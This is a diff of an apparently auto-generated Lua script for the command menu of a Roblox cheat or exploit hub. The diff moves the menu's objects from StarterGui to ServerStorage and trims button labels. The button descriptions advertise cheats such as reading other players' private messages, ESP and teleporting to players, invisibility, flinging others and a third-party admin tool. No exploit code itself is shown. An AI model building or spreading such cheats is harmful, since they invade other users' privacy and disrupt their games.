--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >scpfuturistic
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >scpfuturistic
 G2L["5b"] = Instance.new("TextButton", G2L["11"]);
 G2L["5b"]["TextWrapped"] = true;
 G2L["5b"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -977,13 +986,13 @@ G2L["5b"]["Name"] = [[ >scpfuturistic]];
 G2L["5b"]["Text"] = [[ >scpfuturistic]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >scpfuturistic.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >scpfuturistic.Info
 G2L["5c"] = Instance.new("StringValue", G2L["5b"]);
 G2L["5c"]["Name"] = [[Info]];
 G2L["5c"]["Value"] = [[Command Info: Newest version of SCP Futuristic gui I made since I updated it.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >togglekillbricks
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >togglekillbricks
 G2L["5d"] = Instance.new("TextButton", G2L["11"]);
 G2L["5d"]["TextWrapped"] = true;
 G2L["5d"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -999,13 +1008,13 @@ G2L["5d"]["Name"] = [[ >togglekillbricks]];
 G2L["5d"]["Text"] = [[ >togglekillbricks]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >togglekillbricks.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >togglekillbricks.Info
 G2L["5e"] = Instance.new("StringValue", G2L["5d"]);
 G2L["5e"]["Name"] = [[Info]];
 G2L["5e"]["Value"] = [[Command Info: Makes kill bricks not kill you. Press Z to toggle.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >doorsgui
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >doorsgui
 G2L["5f"] = Instance.new("TextButton", G2L["11"]);
 G2L["5f"]["TextWrapped"] = true;
 G2L["5f"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1021,13 +1030,13 @@ G2L["5f"]["Name"] = [[ >doorsgui]];
 G2L["5f"]["Text"] = [[ >doorsgui]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >doorsgui.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >doorsgui.Info
 G2L["60"] = Instance.new("StringValue", G2L["5f"]);
 G2L["60"]["Name"] = [[Info]];
 G2L["60"]["Value"] = [[Command Info: new doors gui added so have fun and im pretty sure its keyless too]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatspy
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatspy
 G2L["61"] = Instance.new("TextButton", G2L["11"]);
 G2L["61"]["TextWrapped"] = true;
 G2L["61"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1043,13 +1052,13 @@ G2L["61"]["Name"] = [[ >chatspy]];
 G2L["61"]["Text"] = [[ >chatspy]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatspy.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatspy.Info
 G2L["62"] = Instance.new("StringValue", G2L["61"]);
 G2L["62"]["Name"] = [[Info]];
 G2L["62"]["Value"] = [[Command Info: Let's you spy on private messages and stuff and i edited it and i hope it works for new chat now]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >translator
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >translator
 G2L["63"] = Instance.new("TextButton", G2L["11"]);
 G2L["63"]["TextWrapped"] = true;
 G2L["63"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1065,13 +1074,13 @@ G2L["63"]["Name"] = [[ >translator]];
 G2L["63"]["Text"] = [[ >translator]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >translator.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >translator.Info
 G2L["64"] = Instance.new("StringValue", G2L["63"]);
 G2L["64"]["Name"] = [[Info]];
 G2L["64"]["Value"] = [[Command Info: Uses the og chat translator that mastermz showcased but i edited it to hopefully make it work for new chat but with the cost of losing the ability of sending messages with that language]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >invis
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >invis
 G2L["65"] = Instance.new("TextButton", G2L["11"]);
 G2L["65"]["TextWrapped"] = true;
 G2L["65"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1087,18 +1096,18 @@ G2L["65"]["Name"] = [[ >invis]];
 G2L["65"]["Text"] = [[ >invis]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >invis.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >invis.Info
 G2L["66"] = Instance.new("StringValue", G2L["65"]);
 G2L["66"]["Name"] = [[Info]];
 G2L["66"]["Value"] = [[Command Info: Togglable invisibility. (press G for computer)]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.maininfo
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.maininfo
 G2L["67"] = Instance.new("LocalScript", G2L["11"]);
 G2L["67"]["Name"] = [[maininfo]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >namelessadmin
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >namelessadmin
 G2L["68"] = Instance.new("TextButton", G2L["11"]);
 G2L["68"]["TextWrapped"] = true;
 G2L["68"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1114,13 +1123,13 @@ G2L["68"]["Name"] = [[ >namelessadmin]];
 G2L["68"]["Text"] = [[ >namelessadmin]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >namelessadmin.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >namelessadmin.Info
 G2L["69"] = Instance.new("StringValue", G2L["68"]);
 G2L["69"]["Name"] = [[Info]];
 G2L["69"]["Value"] = [[Command Info: Basically the best fe admin there is to my knowledge at least.]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>quiz
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >quiz
 G2L["6a"] = Instance.new("TextButton", G2L["11"]);
 G2L["6a"]["TextWrapped"] = true;
 G2L["6a"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1136,13 +1145,13 @@ G2L["6a"]["Name"] = [[ >quiz]];
 G2L["6a"]["Text"] = [[ >quiz]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>quiz.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >quiz.Info
 G2L["6b"] = Instance.new("StringValue", G2L["6a"]);
 G2L["6b"]["Name"] = [[Info]];
 G2L["6b"]["Value"] = [[Command Info: Opens the quiz gui where you can chat some quizes and stuff with random players choosing answers and it has so many types of quizes too]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>chatdraw
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatdraw
 G2L["6c"] = Instance.new("TextButton", G2L["11"]);
 G2L["6c"]["TextWrapped"] = true;
 G2L["6c"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1155,16 +1164,16 @@ G2L["6c"]["ZIndex"] = 2147483647;
 G2L["6c"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["6c"]["BackgroundTransparency"] = 1;
 G2L["6c"]["Name"] = [[ >chatdraw]];
-G2L["6c"]["Text"] = [[ >chatdraw]];
+G2L["6c"]["Text"] = [[>chatdraw]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>chatdraw.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >chatdraw.Info
 G2L["6d"] = Instance.new("StringValue", G2L["6c"]);
 G2L["6d"]["Name"] = [[Info]];
 G2L["6d"]["Value"] = [[Command Info: Gives a gui where you can draw stuff  and put it into the chat]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>shyguy
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >shyguy
 G2L["6e"] = Instance.new("TextButton", G2L["11"]);
 G2L["6e"]["TextWrapped"] = true;
 G2L["6e"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1177,16 +1186,16 @@ G2L["6e"]["ZIndex"] = 2147483647;
 G2L["6e"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["6e"]["BackgroundTransparency"] = 1;
 G2L["6e"]["Name"] = [[ >shyguy]];
-G2L["6e"]["Text"] = [[ >shyguy]];
+G2L["6e"]["Text"] = [[>shyguy]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>shyguy.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >shyguy.Info
 G2L["6f"] = Instance.new("StringValue", G2L["6e"]);
 G2L["6f"]["Name"] = [[Info]];
 G2L["6f"]["Value"] = [[Command Info: Gives a gui that lets you do a few stuff like turning on touch fling and then turning into scp 096/shy guy (may have had updates since but idk)]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>spy
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spy
 G2L["70"] = Instance.new("TextButton", G2L["11"]);
 G2L["70"]["TextWrapped"] = true;
 G2L["70"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1199,16 +1208,16 @@ G2L["70"]["ZIndex"] = 2147483647;
 G2L["70"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["70"]["BackgroundTransparency"] = 1;
 G2L["70"]["Name"] = [[ >spy]];
-G2L["70"]["Text"] = [[ >spy]];
+G2L["70"]["Text"] = [[>spy]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>spy.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >spy.Info
 G2L["71"] = Instance.new("StringValue", G2L["70"]);
 G2L["71"]["Name"] = [[Info]];
 G2L["71"]["Value"] = [[Command Info: Gives a gui to spy on players like esp, viewing, and teleporting to the player]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>hug
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >hug
 G2L["72"] = Instance.new("TextButton", G2L["11"]);
 G2L["72"]["TextWrapped"] = true;
 G2L["72"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1221,16 +1230,16 @@ G2L["72"]["ZIndex"] = 2147483647;
 G2L["72"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["72"]["BackgroundTransparency"] = 1;
 G2L["72"]["Name"] = [[ >hug]];
-G2L["72"]["Text"] = [[ >hug]];
+G2L["72"]["Text"] = [[>hug]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>hug.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >hug.Info
 G2L["73"] = Instance.new("StringValue", G2L["72"]);
 G2L["73"]["Name"] = [[Info]];
 G2L["73"]["Value"] = [[Command Info: idk exactly what it does but what ik is you can hug people by pressing H]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>skibidirizz
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >skibidirizz
 G2L["74"] = Instance.new("TextButton", G2L["11"]);
 G2L["74"]["TextWrapped"] = true;
 G2L["74"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1243,16 +1252,16 @@ G2L["74"]["ZIndex"] = 2147483647;
 G2L["74"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["74"]["BackgroundTransparency"] = 1;
 G2L["74"]["Name"] = [[ >skibidirizz]];
-G2L["74"]["Text"] = [[ >skibidirizz]];
+G2L["74"]["Text"] = [[>skibidirizz]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>skibidirizz.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >skibidirizz.Info
 G2L["75"] = Instance.new("StringValue", G2L["74"]);
 G2L["75"]["Name"] = [[Info]];
 G2L["75"]["Value"] = [[Command Info: makes you say brainrot rizz if I remember correctly with a click of a button]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>rizz
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rizz
 G2L["76"] = Instance.new("TextButton", G2L["11"]);
 G2L["76"]["TextWrapped"] = true;
 G2L["76"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1265,16 +1274,16 @@ G2L["76"]["ZIndex"] = 2147483647;
 G2L["76"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["76"]["BackgroundTransparency"] = 1;
 G2L["76"]["Name"] = [[ >rizz]];
-G2L["76"]["Text"] = [[ >rizz]];
+G2L["76"]["Text"] = [[>rizz]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>rizz.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rizz.Info
 G2L["77"] = Instance.new("StringValue", G2L["76"]);
 G2L["77"]["Name"] = [[Info]];
 G2L["77"]["Value"] = [[Command Info: gives you a gui with actual rizz lines and stuff]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>emotes
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >emotes
 G2L["78"] = Instance.new("TextButton", G2L["11"]);
 G2L["78"]["TextWrapped"] = true;
 G2L["78"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1287,16 +1296,16 @@ G2L["78"]["ZIndex"] = 2147483647;
 G2L["78"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["78"]["BackgroundTransparency"] = 1;
 G2L["78"]["Name"] = [[ >emotes]];
-G2L["78"]["Text"] = [[ >emotes]];
+G2L["78"]["Text"] = [[>emotes]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>emotes.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >emotes.Info
 G2L["79"] = Instance.new("StringValue", G2L["78"]);
 G2L["79"]["Name"] = [[Info]];
 G2L["79"]["Value"] = [[Command Info: Gives you an emote gui which is the one thats used in those tiktok rizz videos idk]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>blackhole
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >blackhole
 G2L["7a"] = Instance.new("TextButton", G2L["11"]);
 G2L["7a"]["TextWrapped"] = true;
 G2L["7a"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1309,16 +1318,16 @@ G2L["7a"]["ZIndex"] = 2147483647;
 G2L["7a"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["7a"]["BackgroundTransparency"] = 1;
 G2L["7a"]["Name"] = [[ >blackhole]];
-G2L["7a"]["Text"] = [[ >blackhole]];
+G2L["7a"]["Text"] = [[>blackhole]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>blackhole.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >blackhole.Info
 G2L["7b"] = Instance.new("StringValue", G2L["7a"]);
 G2L["7b"]["Name"] = [[Info]];
 G2L["7b"]["Value"] = [[Command Info: Gives a little gui that you can put a username in and thenj turn someone into a blackhole that uses unanchoredparts around you which you must walk near those parts or on them for them to go to them]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>obbytroll
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >obbytroll
 G2L["7c"] = Instance.new("TextButton", G2L["11"]);
 G2L["7c"]["TextWrapped"] = true;
 G2L["7c"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1331,16 +1340,16 @@ G2L["7c"]["ZIndex"] = 2147483647;
 G2L["7c"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["7c"]["BackgroundTransparency"] = 1;
 G2L["7c"]["Name"] = [[ >obbytroll]];
-G2L["7c"]["Text"] = [[ >obbytroll]];
+G2L["7c"]["Text"] = [[>obbytroll]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>obbytroll.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >obbytroll.Info
 G2L["7d"] = Instance.new("StringValue", G2L["7c"]);
 G2L["7d"]["Name"] = [[Info]];
 G2L["7d"]["Value"] = [[Command Info: Lets you activate stages of obbies that use disappearing parts when touched]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>rejoin
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rejoin
 G2L["7e"] = Instance.new("TextButton", G2L["11"]);
 G2L["7e"]["TextWrapped"] = true;
 G2L["7e"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1353,16 +1362,16 @@ G2L["7e"]["ZIndex"] = 2147483647;
 G2L["7e"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["7e"]["BackgroundTransparency"] = 1;
 G2L["7e"]["Name"] = [[ >rejoin]];
-G2L["7e"]["Text"] = [[ >rejoin]];
+G2L["7e"]["Text"] = [[>rejoin]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>rejoin.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >rejoin.Info
 G2L["7f"] = Instance.new("StringValue", G2L["7e"]);
 G2L["7f"]["Name"] = [[Info]];
 G2L["7f"]["Value"] = [[Command Info: Yes I finally added a rejoin command]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>serverhop
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >serverhop
 G2L["80"] = Instance.new("TextButton", G2L["11"]);
 G2L["80"]["TextWrapped"] = true;
 G2L["80"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1375,16 +1384,16 @@ G2L["80"]["ZIndex"] = 2147483647;
 G2L["80"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["80"]["BackgroundTransparency"] = 1;
 G2L["80"]["Name"] = [[ >serverhop]];
-G2L["80"]["Text"] = [[ >serverhop]];
+G2L["80"]["Text"] = [[>serverhop]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>serverhop.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >serverhop.Info
 G2L["81"] = Instance.new("StringValue", G2L["80"]);
 G2L["81"]["Name"] = [[Info]];
 G2L["81"]["Value"] = [[Command Info: I added a server hop command as well too]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>graphics
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >graphics
 G2L["82"] = Instance.new("TextButton", G2L["11"]);
 G2L["82"]["TextWrapped"] = true;
 G2L["82"]["TextColor3"] = Color3.fromRGB(0, 171, 255);
@@ -1397,32 +1406,428 @@ G2L["82"]["ZIndex"] = 2147483647;
 G2L["82"]["Size"] = UDim2.new(0.923, 0, 0.003, 0);
 G2L["82"]["BackgroundTransparency"] = 1;
 G2L["82"]["Name"] = [[ >graphics]];
-G2L["82"]["Text"] = [[ >graphics]];
+G2L["82"]["Text"] = [[>graphics]];
 
 
--- StarterGui.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll.>graphics.Info
+-- ServerStorage.GFUYHjBJHjHjhvfjhvfjhjhfjHJhHFhfyyhfHFJYFTYhhfJhfyHFTYHJhftyjYHfjh.CmdFrame.Frame.CmdScroll. >graphics.Info
 G2L["83"] = Instance.new("StringValue", G2L["82"]);
 G2L["83"]["Name"] = [[Info]];
 G2L["83"]["Value"] = [[Command Info: Graphics gui that sets your graphics like rtx or any others and has presets aswell which makes it pretty cool and has good lighting]];
 
 
